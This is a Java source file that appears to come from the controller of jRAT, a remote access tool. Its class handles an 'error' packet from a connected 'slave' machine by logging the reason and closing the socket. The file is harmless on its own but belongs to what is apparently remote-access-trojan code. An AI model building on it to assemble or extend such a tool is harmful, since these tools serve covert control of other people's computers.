package jrat.controller.packets.incoming;

import jrat.controller.LogAction;
import jrat.controller.Main;
import jrat.controller.Slave;
import jrat.controller.exceptions.CloseException;


public class Packet60Error implements IncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		String reason = slave.readLine();

		Main.instance.getPanelLog().addEntry(LogAction.ERROR, slave, reason);

		slave.closeSocket(new CloseException("Error packet: " + reason));
	}

}
